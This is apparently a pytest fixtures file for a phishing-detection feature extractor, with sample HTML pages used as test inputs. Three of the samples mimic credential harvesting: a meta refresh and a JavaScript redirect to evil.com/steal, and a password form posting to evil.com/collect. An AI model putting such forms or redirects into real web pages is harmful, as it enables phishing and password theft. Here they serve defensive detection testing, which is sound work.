"""Shared test fixtures."""

import pytest

from backend.feature_extraction.feature_extractor import ExtractedFeatures, DomFeatures, FormDetails


def make_features(
    url: str = "https://example.com",
    html: str = "",
    extra_headers: dict = None,
) -> ExtractedFeatures:
    """Build ExtractedFeatures by running the real FeatureExtractor pipeline."""
    from backend.feature_extraction.feature_extractor import FeatureExtractor

    headers = {"content-type": "text/html; charset=utf-8"}
    if extra_headers:
        headers.update(extra_headers)
    if not html:
        headers = {}

    return FeatureExtractor().extract(url, "GET", headers, html.encode())


# ---------------------------------------------------------------------------
# Common HTML snippets
# ---------------------------------------------------------------------------

HTML_PASSWORD_FORM = """
<html><head><title>Login</title></head>
<body>
  <form action="/login" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
  </form>
</body></html>
"""

HTML_CREDIT_CARD_FORM = """
<html><head><title>Payment</title></head>
<body>
  <form action="/pay" method="post">
    <input type="text" name="card-number">
    <input type="text" name="cvv">
    <input type="text" name="exp-date">
    <input type="submit" value="Pay">
  </form>
</body></html>
"""

HTML_BENIGN = """
<html><head><title>Welcome</title></head>
<body><p>Hello world</p></body>
</html>
"""

HTML_PAYPAL_TITLE = """
<html><head><title>PayPal – Login</title></head>
<body>
  <form action="/login" method="post">
    <input type="password" name="password">
  </form>
</body></html>
"""

HTML_META_REFRESH_EXTERNAL = """
<html>
<head>
  <meta http-equiv="refresh" content="0; url=https://evil.com/steal">
  <title>Redirect</title>
</head>
<body>
  <form><input type="password" name="password"></form>
</body></html>
"""

HTML_JS_REDIRECT_EXTERNAL = """
<html><head><title>Pay</title></head>
<body>
  <form><input type="password" name="password"></form>
  <script>window.location.href = "https://evil.com/steal";</script>
</body></html>
"""

HTML_EXTERNAL_FORM_ACTION = """
<html><head><title>Login</title></head>
<body>
  <form action="https://evil.com/collect" method="post">
    <input type="password" name="password">
  </form>
</body></html>
"""
